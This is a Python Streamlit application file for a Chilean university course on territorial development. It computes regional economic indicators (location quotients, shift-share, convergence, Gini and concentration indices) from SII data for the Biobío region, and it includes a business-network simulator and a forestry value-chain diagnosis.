# -*- coding: utf-8 -*-
"""
PLATAFORMA INTEGRAL DE DESARROLLO Y GESTIÓN TERRITORIAL 2026
Universidad de Los Lagos — Ingeniería Comercial
Asignatura: Desarrollo y Gestión Territorial (Prof. Claudio Mancilla)
Archivo Principal: app.py
"""

import os
import numpy as np
import pandas as pd
import plotly.express as px
import plotly.graph_objects as go
import streamlit as st

import motor_sii_exportador as msii
from motor_laboratorio_catedra import renderizar_laboratorio_catedra
from motor_teoria_territorial import renderizar_modulo_teoria_avanzada
from motor_redes_territorio_ot import renderizar_redes_territorio_ot, _renderizar_mapa_puntos_seguro
from motor_redes_dinamicas_dini import (
    renderizar_extension_redes_y_gradientes,
    renderizar_burbuja_tip,
    inyectar_estilos_burbujas,
)

try:
    from motor_fluidez_territorial_60fps import renderizar_laboratorio_fluido_territorial
except Exception:
    renderizar_laboratorio_fluido_territorial = None


# CONFIGURACIÓN DE PÁGINA Y ESTILO INSTITUCIONAL LIMPIO
st.set_page_config(
    page_title="Desarrollo y Gestión Territorial 2026 — ULagos",
    layout="wide",
    initial_sidebar_state="expanded",
)

st.markdown(
    """
    <style>
    .block-container {
        padding-top: 1.4rem;
        padding-bottom: 2rem;
    }
    div[data-testid="stMetric"] {
        background-color: #f8fafc;
        border: 1px solid #e2e8f0;
        padding: 12px 14px;
        border-radius: 6px;
    }
    h1, h2, h3 {
        color: #1e293b;
        font-weight: 600;
    }
    </style>
    """,
    unsafe_allow_html=True,
)
inyectar_estilos_burbujas()


ARCHIVO_EXCEL_REPO = "ILPES GRUPO 10 29-10-2026.xlsx"
ARCHIVO_PDF_CUESTIONARIO = "cuestionario_entrevista.pdf"


# UTILIDADES PARA CARGA POR DEFECTO DEL CASO BIOBÍO (2014 - 2024)
@st.cache_data(show_spinner=False)
def obtener_resultados_base_repo(
    ruta_excel: str,
    region_objetivo: str = "Región del Biobío",
    variable_objetivo: str = "Ventas anuales en UF",
    anio_0: int = 2014,
    anio_t: int = 2024,
    alpha_hk: float = 2.0,
):
    if not os.path.exists(ruta_excel):
        return None, None, "No se encontró el archivo base en la raíz del repositorio."

    df_sii, meta = msii.cargar_base_nacional_sii(ruta_excel)
    col_region = meta["col_region"]
    col_anio = meta["col_anio"]
    metricas = meta["columnas_metricas"]

    regiones_disp = (
        sorted(df_sii[col_region].dropna().astype(str).str.strip().unique().tolist())
        if col_region
        else ["Todas (Consolidado)"]
    )
    reg_sel = regiones_disp[0]
    for r in regiones_disp:
        if "biob" in msii._normalizar_texto(r) or msii._normalizar_texto(region_objetivo) in msii._normalizar_texto(r):
            reg_sel = r
            break

    var_sel = metricas[0] if metricas else variable_objetivo
    for m in metricas:
        if msii._normalizar_texto(variable_objetivo) in msii._normalizar_texto(m):
            var_sel = m
            break

    anios_disp = sorted(df_sii[col_anio].dropna().unique().tolist())
    a0 = anio_0 if anio_0 in anios_disp else anios_disp[0]
    at = anio_t if anio_t in anios_disp else anios_disp[-1]

    V0, Vt = msii.construir_matrices_region(df_sii, meta, reg_sel, a0, at, var_sel)
    res = msii.calcular_todo_el_ramo(V0, Vt, a0, at, alpha_hk=alpha_hk)
    contexto = {
        "region": reg_sel,
        "variable": var_sel,
        "anio_0": a0,
        "anio_t": at,
        "regiones_disp": regiones_disp,
        "metricas_disp": metricas,
        "anios_disp": anios_disp,
    }
    return res, contexto, None


# MÓDULO 1: TÉCNICAS DE ANÁLISIS REGIONAL (ILPES / SII BIOBÍO 2014-2024)
def vista_modulo_1_ilpes():
    st.header("2. Técnicas de Análisis Regional (ILPES / SII 2014–2024)")
    st.markdown(
        "Evaluación estructural e intertemporal mediante matrices sectoriales-comunales del SII: "
        "**Cociente de Localización ($Q_{ij}$)**, **Coeficiente de Especialización ($Q_r$)**, "
        "**Coeficiente de Reestructuración ($CR_r$)**, **Base Económica Exportadora ($X_j, M_j$)**, "
        "**Cuadrantes de Silva Lira (CEPAL, 2005)** y **Shift & Share (MADE Clásico y Modificado)**."
    )

    if not os.path.exists(ARCHIVO_EXCEL_REPO):
        st.warning(
            f"No se encontró `{ARCHIVO_EXCEL_REPO}` en la raíz. "
            "Dirígete al Módulo 9 (Exportador Maestro SII) para subir un archivo manualmente."
        )
        return

    df_sii, meta = msii.cargar_base_nacional_sii(ARCHIVO_EXCEL_REPO)
    regiones = sorted(df_sii[meta["col_region"]].dropna().astype(str).str.strip().unique().tolist())
    metricas = meta["columnas_metricas"]
    anios = sorted(df_sii[meta["col_anio"]].dropna().unique().tolist())

    idx_biobio = 0
    for i, r in enumerate(regiones):
        if "biob" in msii._normalizar_texto(r):
            idx_biobio = i
            break

    idx_a0_def = anios.index(2014) if 2014 in anios else 0

    c1, c2, c3, c4 = st.columns([2.2, 2.2, 1, 1])
    with c1:
        reg_sel = st.selectbox("Región de análisis:", regiones, index=idx_biobio, key="m1_reg")
    with c2:
        var_sel = st.selectbox("Variable SII:", metricas, index=0, key="m1_var")
    with c3:
        a0 = st.selectbox("Año inicial ($t_0$):", anios, index=idx_a0_def, key="m1_a0")
    with c4:
        at = st.selectbox("Año final ($t_f$):", anios, index=len(anios) - 1, key="m1_at")

    if int(a0) >= int(at):
        st.error("El año final debe ser mayor al año inicial.")
        return

    V0, Vt = msii.construir_matrices_region(df_sii, meta, reg_sel, a0, at, var_sel)
    res = msii.calcular_todo_el_ramo(V0, Vt, a0, at, alpha_hk=2.0)
    tot = res["totales"]

    k1, k2, k3, k4 = st.columns(4)
    k1.metric("Comunas Analizadas", f"{tot['n_comunas']}")
    k2.metric("Rubros Económicos SII", f"{tot['n_rubros']}")
    k3.metric(f"Total Regional {a0}", f"{tot['total_reg_0']:,.1f}")
    k4.metric(f"Total Regional {at}", f"{tot['total_reg_t']:,.1f}", f"{tot['tasa_var_reg']:+.2f}%")

    # Fila de Burbujas Informativas del Módulo 1
    b1, b2, b3, b4 = st.columns(4)
    with b1:
        renderizar_burbuja_tip(
            titulo_boton="Tip: ¿Cómo leer Silva Lira?",
            titulo_interno="Cuadrantes de Silva Lira (CEPAL, 2005)",
            explicacion_md=(
                "- **Eje X (Nivel per cápita):** Compara el valor per cápita comunal (Censo 2024) con el promedio regional (o participación si no hay población precargada).\n"
                "- **Eje Y (Dinamismo):** Compara la tasa promedio anual de crecimiento $((V_t/V_0)^{1/T}-1)$ con la tasa promedio anual regional.\n"
                "- **I. Dinámica (+,+):** Alto nivel per cápita y crece sobre el promedio regional.\n"
                "- **II. Emergente (-,+):** Bajo nivel per cápita pero crece rápido (convergente).\n"
                "- **III. Estancada (+,-):** Alto nivel per cápita pero crece bajo el promedio.\n"
                "- **IV. En retroceso (-,-):** Bajo nivel per cápita y bajo dinamismo."
            ),
        )
    with b2:
        renderizar_burbuja_tip(
            titulo_boton="Tip: Fórmulas Qij, Qr y CRr",
            titulo_interno="Localización (Qij), Especialización (Qr) y Reestructuración (CRr)",
            formula_latex=r"Q_{ij} = \frac{V_{ij}/\sum_i V_{ij}}{\sum_j V_{ij}/\sum_i \sum_j V_{ij}} \quad ; \quad Q_r = \frac{1}{2}\sum_i |P_{ij} - P_i|",
            explicacion_md=(
                "- **$Q_{ij} > 1$:** La comuna está especializada en el rubro $i$ (actividad básica exportadora).\n"
                "- **$Q_r \\in [0, 1]$:** Si tiende a $0$, la estructura comunal es diversificada (igual a la región); si tiende a $1$, es altamente especializada.\n"
                "- **$CR_r \\in [0, 1]$:** Mide cuánto cambió la estructura productiva de la comuna entre $t_0$ y $t_f$."
            ),
        )
    with b3:
        renderizar_burbuja_tip(
            titulo_boton="Tip: Base Exportadora (Xj y Mj)",
            titulo_interno="Modelo de Base Económica (Tiebout / Lira & Quiroga)",
            formula_latex=r"X_{ij} = V_{ij} - \frac{V_{ij}}{Q_{ij}} \quad (\forall Q_{ij}>1) \quad ; \quad M_j = \frac{V_j}{X_j}",
            explicacion_md=(
                "- **$X_j$:** Excedente producido por sobre la media regional que se 'exporta' hacia otras comunas o mercados.\n"
                "- **Multiplicador $M_j$:** Indica cuántas unidades de actividad total se generan en la comuna por cada $1$ unidad de base exportadora."
            ),
        )
    with b4:
        renderizar_burbuja_tip(
            titulo_boton="Tip: Shift & Share (MADE)",
            titulo_interno="Efectos Total (ET), Estructural (EE) y Diferencial (ED)",
            formula_latex=r"ET_j = EE_j + ED_j",
            explicacion_md=(
                "- **$ET_j > 0$:** La comuna creció por encima de lo esperado si hubiese seguido el promedio regional.\n"
                "- **$EE_j > 0$ (Efecto Estructural):** La comuna estaba especializada en rubros dinámicos a nivel regional.\n"
                "- **$ED_j > 0$ (Efecto Diferencial / Competitivo):** Los rubros dentro de la comuna crecieron más rápido que esos mismos rubros en la región."
            ),
        )

    subtabs = st.tabs([
        "Cuadrantes de Silva Lira",
        "Localización (Qij) y Especialización (Qr, CRr)",
        "Base Económica Exportadora (Xj y Mj)",
        "Shift & Share (MADE Clásico y Modificado)",
    ])

    with subtabs[0]:
        df_ss = res["df_shift_share"].copy()
        T_per = max(int(at) - int(a0), 1)
        pob_m1 = msii._obtener_poblacion_comunas(list(df_ss["Comuna"]))
        lbl_v0, lbl_vt, lbl_pc, _, _ = msii._etiquetas_variable_sii(var_sel, a0, at)

        v0_arr = df_ss[f"Nivel_{a0}"].values.astype(float)
        vt_arr = df_ss[f"Nivel_{at}"].values.astype(float)
        tpa_pct = np.where((v0_arr > 0) & (vt_arr > 0), ((vt_arr / v0_arr) ** (1.0 / T_per) - 1.0) * 100.0, 0.0)
        tpa_reg_pct = (
            ((tot["total_reg_t"] / tot["total_reg_0"]) ** (1.0 / T_per) - 1.0) * 100.0
            if tot["total_reg_0"] > 0 and tot["total_reg_t"] > 0
            else 0.0
        )

        if pob_m1 is not None:
            pob_arr = np.array(pob_m1, dtype=float)
            pc_arr = vt_arr / np.maximum(pob_arr, 1.0)
            umbral_x_m1 = tot["total_reg_t"] / max(float(np.sum(pob_arr)), 1.0)
            cuads_m1 = [
                "I. Dinámica" if (pc_arr[i] >= umbral_x_m1 and tpa_pct[i] >= tpa_reg_pct)
                else ("II. Emergente" if (pc_arr[i] < umbral_x_m1 and tpa_pct[i] >= tpa_reg_pct)
                else ("III. Estancada" if (pc_arr[i] >= umbral_x_m1 and tpa_pct[i] < tpa_reg_pct)
                else "IV. En retroceso"))
                for i in range(len(df_ss))
            ]
            df_silva_m1 = pd.DataFrame({
                "Comuna": df_ss["Comuna"].values,
                lbl_v0: v0_arr,
                lbl_vt: vt_arr,
                "Población": pob_m1,
                "Tasa prom. de crecimiento (%)": tpa_pct,
                lbl_pc: pc_arr,
                "Cuadrante Silva Lira": cuads_m1,
            })
            x_col_m1, x_lbl_m1, vline_txt_m1 = lbl_pc, lbl_pc, f"Promedio Regional ({umbral_x_m1:,.1f})"
        else:
            part_arr = (vt_arr / max(tot["total_reg_t"], 1e-9)) * 100.0
            umbral_x_m1 = 100.0 / max(tot["n_comunas"], 1)
            cuads_m1 = [
                "I. Dinámica" if (part_arr[i] >= umbral_x_m1 and tpa_pct[i] >= tpa_reg_pct)
                else ("II. Emergente" if (part_arr[i] < umbral_x_m1 and tpa_pct[i] >= tpa_reg_pct)
                else ("III. Estancada" if (part_arr[i] >= umbral_x_m1 and tpa_pct[i] < tpa_reg_pct)
                else "IV. En retroceso"))
                for i in range(len(df_ss))
            ]
            df_silva_m1 = pd.DataFrame({
                "Comuna": df_ss["Comuna"].values,
                lbl_v0: v0_arr,
                lbl_vt: vt_arr,
                "Tasa prom. de crecimiento (%)": tpa_pct,
                f"Participación {at} (%)": part_arr,
                "Cuadrante Silva Lira": cuads_m1,
            })
            x_col_m1 = f"Participación {at} (%)"
            x_lbl_m1 = x_col_m1
            vline_txt_m1 = f"Participación Media ({umbral_x_m1:.2f}%)"

        fig_silva = px.scatter(
            df_silva_m1,
            x=x_col_m1,
            y="Tasa prom. de crecimiento (%)",
            color="Cuadrante Silva Lira",
            hover_name="Comuna",
            text="Comuna",
            labels={
                x_col_m1: x_lbl_m1,
                "Tasa prom. de crecimiento (%)": f"Tasa promedio anual {a0}–{at} (%)",
            },
            title=f"Cuadrantes de Silva Lira (CEPAL, 2005 — {reg_sel}, {a0}–{at})",
        )
        fig_silva.update_traces(textposition="top center")
        fig_silva.add_hline(
            y=tpa_reg_pct,
            line_dash="dash",
            line_color="#dc2626",
            annotation_text=f"Crecimiento Regional ({tpa_reg_pct:.2f}%)",
        )
        fig_silva.add_vline(
            x=umbral_x_m1,
            line_dash="dash",
            line_color="#1d4ed8",
            annotation_text=vline_txt_m1,
        )
        st.plotly_chart(fig_silva, use_container_width=True)

        resumen_cuad = (
            df_silva_m1.groupby("Cuadrante Silva Lira")
            .agg(
                Numero_Comunas=("Comuna", "count"),
                Comunas=("Comuna", lambda x: ", ".join(sorted(x))),
            )
            .reset_index()
        )
        st.dataframe(resumen_cuad, use_container_width=True, hide_index=True)

    with subtabs[1]:
        st.markdown(f"**Matriz de Cociente de Localización ($Q_{{ij}}$) — Año {at}**")
        fig_q = px.imshow(
            res["Q_ij_t"],
            aspect="auto",
            color_continuous_scale="RdBu_r",
            labels={"x": "Comuna", "y": "Rubro Económico", "color": "Q_ij"},
        )
        fig_q.update_layout(height=500)
        st.plotly_chart(fig_q, use_container_width=True)

        st.markdown("**Coeficiente de Especialización ($Q_r$) y Coeficiente de Reestructuración ($CR_r$)**")
        st.dataframe(res["df_especializacion"].round(4), use_container_width=True, hide_index=True)

    with subtabs[2]:
        st.markdown(
            "**Modelo de Base Económica de Tiebout / Lira & Quiroga:** "
            "Los sectores con $Q_{ij} > 1$ generan excedente básico exportable ($X_{ij} > 0$). "
            "El multiplicador básico comunal se define como $M_j = V_j / X_j$."
        )
        cols_base = [
            "Comuna",
            f"Total_{at}",
            f"Base_Exportadora_Xj_{at}",
            f"Prop_Basica_{at}_%",
            f"Multiplicador_Basico_Mj_{at}",
        ]
        df_base = res["df_especializacion"][cols_base].sort_values(
            f"Base_Exportadora_Xj_{at}", ascending=False
        )
        st.dataframe(df_base.round(3), use_container_width=True, hide_index=True)

        fig_base = px.bar(
            df_base.head(20),
            x="Comuna",
            y=[f"Base_Exportadora_Xj_{at}", f"Total_{at}"],
            barmode="group",
            title=f"Top 20 Comunas por Actividad Básica Exportadora ({at})",
        )
        st.plotly_chart(fig_base, use_container_width=True)

    with subtabs[3]:
        st.markdown(
            "**Descomposición Shift & Share Clásico ($ET_j = EE_j + ED_j$) y "
            "MADE Modificado ($EI_j, EM_j, ERM_j$)**"
        )
        st.dataframe(res["df_shift_share"].round(2), use_container_width=True, hide_index=True)

        fig_made = px.bar(
            res["df_shift_share"].sort_values("Efecto_Total_ET", ascending=False),
            x="Comuna",
            y=["Efecto_Estructural_EE", "Efecto_Diferencial_ED", "Efecto_Inverso_EI"],
            barmode="relative",
            title=f"Efectos Estructural (EE), Diferencial (ED) e Inverso (EI) por Comuna ({a0}–{at})",
        )
        st.plotly_chart(fig_made, use_container_width=True)


# MÓDULO 2: DISPARIDADES, CONCENTRACIÓN Y CONVERGENCIA REGIONAL (MOTOR REAT)
def vista_modulo_2_reat():
    st.header("3. Disparidades, Concentración y Convergencia Regional (Motor REAT)")
    st.markdown(
        "Réplica en Python de las funciones econométricas del paquete **`REAT` (Regional Economic Analysis Toolbox)** de R: "
        "**Convergencia Sigma ($\\sigma_t, CV_t$)**, **Convergencia Beta Absoluta ($\\beta$, velocidad $\\lambda$, semivida)**, "
        "**Curva de Lorenz**, **Índice de Gini ($G, G^*$)**, **Entropía de Theil ($T$)**, "
        "**Herfindahl-Hirschman ($HHI$)** e **Índice de Hannah-Kay ($HK_\\alpha$)**."
    )

    if not os.path.exists(ARCHIVO_EXCEL_REPO):
        st.warning(f"No se encontró `{ARCHIVO_EXCEL_REPO}` en la raíz del repositorio.")
        return

    df_sii, meta = msii.cargar_base_nacional_sii(ARCHIVO_EXCEL_REPO)
    regiones = sorted(df_sii[meta["col_region"]].dropna().astype(str).str.strip().unique().tolist())
    metricas = meta["columnas_metricas"]
    anios = sorted(df_sii[meta["col_anio"]].dropna().unique().tolist())

    idx_biobio = 0
    for i, r in enumerate(regiones):
        if "biob" in msii._normalizar_texto(r):
            idx_biobio = i
            break

    idx_a0_def = anios.index(2014) if 2014 in anios else 0

    c1, c2, c3, c4, c5 = st.columns([2, 2, 1, 1, 1.2])
    with c1:
        reg_sel = st.selectbox("Región:", regiones, index=idx_biobio, key="m2_reg")
    with c2:
        var_sel = st.selectbox("Variable:", metricas, index=0, key="m2_var")
    with c3:
        a0 = st.selectbox("Año inicial:", anios, index=idx_a0_def, key="m2_a0")
    with c4:
        at = st.selectbox("Año final:", anios, index=len(anios) - 1, key="m2_at")
    with c5:
        alpha_hk = st.slider("Sensibilidad α (Hannah-Kay):", 0.5, 5.0, 2.0, 0.5, key="m2_alpha")

    V0, Vt = msii.construir_matrices_region(df_sii, meta, reg_sel, a0, at, var_sel)
    res = msii.calcular_todo_el_ramo(V0, Vt, a0, at, alpha_hk=alpha_hk)
    mb = res["metricas_beta"]

    m1, m2, m3, m4, m5 = st.columns(5)
    m1.metric("Pendiente Beta (β)", f"{mb['beta']:.4f}", "Convergente" if mb["beta"] < 0 else "Divergente")
    m2.metric("Velocidad anual (λ)", f"{mb['velocidad_lambda']*100:.2f}%")
    m3.metric(
        "Semivida (Half-life)",
        f"{mb['half_life']:.1f} años" if np.isfinite(mb["half_life"]) else "N/A",
    )
    m4.metric("Bondad R² (OLS)", f"{mb['r2']:.4f}")
    m5.metric("P-valor (β)", f"{mb['p_value']:.4f}")

    # Burbujas informativas del Módulo 2 (REAT)
    rb1, rb2, rb3 = st.columns(3)
    with rb1:
        renderizar_burbuja_tip(
            titulo_boton="Tip: Convergencia Beta y Sigma",
            titulo_interno="¿Qué significan β, λ, Semivida y Sigma?",
            formula_latex=r"\frac{1}{T}\ln\left(\frac{Y_{i,t}}{Y_{i,0}}\right) = \alpha + \beta \ln(Y_{i,0}) + \varepsilon_i \quad ; \quad \lambda = -\frac{\ln(1+\beta T)}{T}",
            explicacion_md=(
                "- **Pendiente $\\beta < 0$:** Existe **Convergencia Beta** (las comunas que partieron más rezagadas crecen a tasas proporcionalmente mayores).\n"
                "- **P-valor $< 0,05$:** Confirma que la convergencia es estadísticamente significativa.\n"
                "- **Semivida ($\\ln(2)/\\lambda$):** Años necesarios para cerrar la mitad de la brecha respecto al estado estacionario.\n"
                "- **Convergencia Sigma ($\\sigma$):** Ocurre si la dispersión $\\sigma(\\ln Y_t)$ cae entre $t_0$ y $t_f$."
            ),
        )
    with rb2:
        renderizar_burbuja_tip(
            titulo_boton="Tip: Curva de Lorenz, Gini y Theil",
            titulo_interno="Desigualdad Territorial (Gini y Entropía de Theil)",
            formula_latex=r"G = 1 - \sum_{i=1}^n (p_i - p_{i-1})(q_i + q_{i-1}) \quad ; \quad T = \sum_{i=1}^n s_i \ln(n \cdot s_i)",
            explicacion_md=(
                "- **Curva de Lorenz:** Mientras más se aleja la curva de la diagonal de $45^\\circ$, mayor es la concentración en pocas comunas.\n"
                "- **Índice de Gini ($0$ a $1$):** $0$ = equidad perfecta; valores sobre $0,50$ indican fuerte concentración.\n"
                "- **Entropía de Theil ($T$):** Rango $[0, \\ln(n)]$. Permite descomponer la desigualdad entre provincias y dentro de ellas."
            ),
        )
    with rb3:
        renderizar_burbuja_tip(
            titulo_boton="Tip: HHI y Hannah-Kay (HKα)",
            titulo_interno="Concentración Absoluta (Herfindahl-Hirschman y Hannah-Kay)",
            formula_latex=r"HHI = \sum_{i=1}^n s_i^2 \quad ; \quad HK_\alpha = \left(\sum_{i=1}^n s_i^\alpha\right)^{\frac{1}{1-\alpha}}",
            explicacion_md=(
                "- **$HHI \\in [1/n, 1]$:** Suma de las cuotas comunales al cuadrado. A mayor valor, mayor monopolio territorial de la capital regional.\n"
                "- **Hannah-Kay ($HK_\\alpha$):** Al subir el parámetro $\\alpha$, penaliza con más fuerza el peso de las comunas gigantes y entrega el **número equivalente de comunas**."
            ),
        )

    st.subheader("Tabla Consolidada de Indicadores REAT")
    st.dataframe(res["df_reat_resumen"].round(4), use_container_width=True, hide_index=True)

    col_izq, col_der = st.columns(2)
    with col_izq:
        df_b = res["df_beta_comunas"]
        fig_beta = px.scatter(
            df_b,
            x=f"ln_Y_{a0}",
            y="Tasa_Crec_Anual_Log",
            hover_name="Comuna",
            text="Comuna",
            title=f"Regresión OLS de Convergencia Beta Absoluta ({a0}–{at})",
            labels={
                f"ln_Y_{a0}": f"Logaritmo Nivel Inicial ln(Y_{a0})",
                "Tasa_Crec_Anual_Log": f"Tasa de Crecimiento Anual Logarítmica (1/T)·ln(Y_{at}/Y_{a0})",
            },
        )
        fig_beta.update_traces(textposition="top center")
        df_b_ord = df_b.sort_values(f"ln_Y_{a0}")
        fig_beta.add_trace(
            go.Scatter(
                x=df_b_ord[f"ln_Y_{a0}"],
                y=df_b_ord["Prediccion_OLS"],
                mode="lines",
                name=f"Recta OLS (β={mb['beta']:.4f})",
                line=dict(color="#dc2626", width=2),
            )
        )
        st.plotly_chart(fig_beta, use_container_width=True)

    with col_der:
        fig_lor = go.Figure()
        fig_lor.add_trace(
            go.Scatter(
                x=[0, 1],
                y=[0, 1],
                mode="lines",
                line=dict(dash="dash", color="#64748b"),
                name="Línea de Equidad Absoluta (45°)",
            )
        )
        fig_lor.add_trace(
            go.Scatter(
                x=mb["lorenz_p_0"],
                y=mb["lorenz_l_0"],
                mode="lines+markers",
                name=f"Curva de Lorenz {a0}",
            )
        )
        fig_lor.add_trace(
            go.Scatter(
                x=mb["lorenz_p_t"],
                y=mb["lorenz_l_t"],
                mode="lines+markers",
                name=f"Curva de Lorenz {at}",
            )
        )
        fig_lor.update_layout(
            title=f"Curva de Concentración de Lorenz ({a0} vs {at})",
            xaxis_title="Proporción Acumulada de Comunas",
            yaxis_title=f"Proporción Acumulada de {var_sel}",
        )
        st.plotly_chart(fig_lor, use_container_width=True)


# MÓDULO 3: SPL, REDES EMPRESARIALES (UCINET / DINI) Y CADENAS DE VALOR (CEPAL)
def vista_modulo_3_redes_cadenas():
    st.header("4. Sistemas Productivos Locales (SPL), Redes Empresariales y Cadenas de Valor")
    st.markdown(
        "Análisis de articulación productiva local según **Dini (2010, CEPAL)** (reemplazo interactivo de **UCINET** "
        "para matrices de adyacencia y centralidad de grafos) y diagnóstico de **Cadenas de Valor** bajo metodología "
        "**Padilla y Oddone (2016, CEPAL)** aplicada al complejo forestal-maderero (caso **PymeMad Biobío / Los Ángeles**) "
        "y ecosistema MIPE regional."
    )

    tabs_spl = st.tabs([
        "1. Simulador de Grafos y Redes (UCINET / Dini 2010)",
        "2. Cadena de Valor Forestal-Maderera (CEPAL / PymeMad)",
        "3. Instrumento de Campo (cuestionario_entrevista.pdf)",
    ])

    with tabs_spl[0]:
        st.subheader("Matriz Sociométrica y Topología de Red Empresarial (Modelo UCINET)")
        nodos_default = [
            "Aserradero PyME 1",
            "Aserradero PyME 2",
            "Remanufactura Maderera",
            "Proveedores Forestales",
            "Transporte y Logística",
            "Gremio PymeMad",
            "Planta Celulosa / Ancla",
            "Centro I+D / Universidad",
        ]
        n_nodos = len(nodos_default)
        mat_base = np.array([
            [0, 1, 1, 1, 1, 1, 0, 0],
            [1, 0, 1, 1, 0, 1, 0, 0],
            [1, 1, 0, 0, 1, 1, 1, 1],
            [1, 1, 0, 0, 1, 1, 1, 0],
            [1, 0, 1, 1, 0, 0, 1, 0],
            [1, 1, 1, 1, 0, 0, 1, 1],
            [0, 0, 1, 1, 1, 1, 0, 1],
            [0, 0, 1, 0, 0, 1, 1, 0],
        ], dtype=int)

        df_adj_init = pd.DataFrame(mat_base, index=nodos_default, columns=nodos_default)
        st.caption("Edita los vínculos binarios (1 = relación de cooperación/subcontratación activa, 0 = sin vínculo):")
        df_adj = st.data_editor(df_adj_init, use_container_width=True, key="editor_ucinet")

        A = df_adj.to_numpy(dtype=float, copy=True)
        np.fill_diagonal(A, 0.0)
        enlaces_totales = float(np.sum(A))
        enlaces_posibles = float(n_nodos * (n_nodos - 1))
        densidad_red = (enlaces_totales / enlaces_posibles) * 100.0 if enlaces_posibles > 0 else 0.0

        grado_salida = np.sum(A, axis=1)
        grado_entrada = np.sum(A, axis=0)
        centralidad_norm = (grado_salida / max(n_nodos - 1, 1)) * 100.0

        c_u1, c_u2, c_u3 = st.columns(3)
        c_u1.metric("Nodos del Sistema Productivo (N)", f"{n_nodos}")
        c_u2.metric("Vínculos Activos / Posibles", f"{int(enlaces_totales)} / {int(enlaces_posibles)}")
        c_u3.metric("Densidad de la Red (Dini / UCINET)", f"{densidad_red:.1f}%")

        renderizar_burbuja_tip(
            titulo_boton="Tip: ¿Cómo interpretar esta Matriz UCINET y dónde ver la Red Animada?",
            titulo_interno="Lectura de Indicadores UCINET / Dini (2010)",
            formula_latex=r"D = \frac{2L}{n(n-1)} = \frac{\sum_i \sum_j a_{ij}}{n(n-1)}",
            explicacion_md=(
                "- **OutDegree / InDegree:** En una matriz dirigida, mide cuántos vínculos emite (salida) y recibe (entrada) cada actor.\n"
                "- **Centralidad $\\ge 60\\%$:** Identifica al **Nodo Articulador / Gobernanza** (ej. *Gremio PymeMad* o *Remanufactura*).\n"
                "- **¿Quieres ver la red armarse paso a paso o editarla en vivo?** Abre el **Módulo 5** en la barra lateral izquierda."
            ),
        )

        angulos = np.linspace(0, 2 * np.pi, n_nodos, endpoint=False)
        xs = np.cos(angulos)
        ys = np.sin(angulos)

        edge_x, edge_y = [], []
        for i in range(n_nodos):
            for j in range(n_nodos):
                if A[i, j] > 0:
                    edge_x.extend([xs[i], xs[j], None])
                    edge_y.extend([ys[i], ys[j], None])

        fig_red = go.Figure()
        fig_red.add_trace(
            go.Scatter(
                x=edge_x,
                y=edge_y,
                mode="lines",
                line=dict(width=1.5, color="#94a3b8"),
                hoverinfo="none",
                name="Relación Productiva",
            )
        )
        fig_red.add_trace(
            go.Scatter(
                x=xs,
                y=ys,
                mode="markers+text",
                text=nodos_default,
                textposition="top center",
                marker=dict(
                    size=18 + centralidad_norm * 0.25,
                    color=centralidad_norm,
                    colorscale="Blues",
                    showscale=True,
                    colorbar=dict(title="Centralidad (%)"),
                    line=dict(width=1.5, color="#1e293b"),
                ),
                name="Actor Territorial",
            )
        )
        fig_red.update_layout(
            title="Topología de Articulación del Sistema Productivo Local (Grafo Sociométrico)",
            xaxis=dict(showgrid=False, zeroline=False, showticklabels=False),
            yaxis=dict(showgrid=False, zeroline=False, showticklabels=False),
            height=480,
        )
        st.plotly_chart(fig_red, use_container_width=True)

        df_metricas_nodos = pd.DataFrame({
            "Actor_Nodo": nodos_default,
            "Grado_Salida_OutDegree": grado_salida.astype(int),
            "Grado_Entrada_InDegree": grado_entrada.astype(int),
            "Centralidad_Grado_%": centralidad_norm.round(2),
            "Rol_Tipologico_Dini": [
                "Nodo Articulador / Gobernanza" if c >= 60 else ("Actor Integrado" if c >= 40 else "Actor Periférico")
                for c in centralidad_norm
            ],
        })
        st.dataframe(df_metricas_nodos, use_container_width=True, hide_index=True)

    with tabs_spl[1]:
        st.subheader("Diagnóstico de Restricciones y Escalamiento (Upgrading) — Cadena Forestal-Maderera")
        df_cadena = pd.DataFrame([
            {
                "Eslabón de la Cadena": "1. Silvicultura y Manejo de Bosques PyME",
                "Actores Clave": "Pequeños y medianos propietarios forestales, contratistas",
                "Cuello de Botella Crítico": "Déficit de trozas aserrables tras incendios y baja tasa de reforestación",
                "Estrategia de Upgrading (CEPAL)": "Upgrading de Proceso: Certificación de manejo sustentable asociativo (PEFC/FSC)",
                "Impacto Esperado (1-5)": 4.8,
            },
            {
                "Eslabón de la Cadena": "2. Aserrío Primario y Secado",
                "Actores Clave": "Aserraderos asociados a PymeMad (Los Ángeles / Biobío)",
                "Cuello de Botella Crítico": "Asimetría en abastecimiento de rollizos y costos de energía/secado en cámara",
                "Estrategia de Upgrading (CEPAL)": "Upgrading Tecnológico: Incorporación de escáneres ópticos y cámaras de secado eficientes",
                "Impacto Esperado (1-5)": 4.6,
            },
            {
                "Eslabón de la Cadena": "3. Remanufactura y Valor Agregado (CLT / Estructural)",
                "Actores Clave": "Plantas de molduras, madera laminada y componentes constructivos",
                "Cuello de Botella Crítico": "Estandarización de clasificación estructural y acceso a financiamiento de capital de trabajo",
                "Estrategia de Upgrading (CEPAL)": "Upgrading de Producto: Transición a madera estructural certificada para construcción industrializada",
                "Impacto Esperado (1-5)": 4.9,
            },
            {
                "Eslabón de la Cadena": "4. Comercialización, Logística y Mercados",
                "Actores Clave": "Consorcios de exportación, distribuidores nacionales, sector público (MINVU)",
                "Cuello de Botella Crítico": "Dependencia de intermediarios y barreras de escala para compras públicas",
                "Estrategia de Upgrading (CEPAL)": "Upgrading Funcional: Consorcios comerciales PymeMad para licitaciones de vivienda pública en madera",
                "Impacto Esperado (1-5)": 4.5,
            },
        ])
        st.dataframe(df_cadena, use_container_width=True, hide_index=True)

    with tabs_spl[2]:
        st.subheader("Instrumento de Levantamiento Primario en Terreno (`cuestionario_entrevista.pdf`)")
        st.markdown(
            "Pauta semiestructurada de entrevista aplicada a actores gremiales y productivos de la cadena de valor "
            "de madera aserrada y servicios forestales (**PymeMad Biobío — Los Ángeles**)."
        )
        if os.path.exists(ARCHIVO_PDF_CUESTIONARIO):
            with open(ARCHIVO_PDF_CUESTIONARIO, "rb") as f_pdf:
                pdf_bytes = f_pdf.read()
            st.download_button(
                label="Descargar Cuestionario de Entrevista Oficial (cuestionario_entrevista.pdf)",
                data=pdf_bytes,
                file_name="cuestionario_entrevista.pdf",
                mime="application/pdf",
            )
        else:
            st.info("El archivo `cuestionario_entrevista.pdf` se cargará automáticamente al estar en la raíz del repositorio.")


# MÓDULO 4: ORDENAMIENTO TERRITORIAL, RONDINELLI Y GEORREFERENCIACIÓN
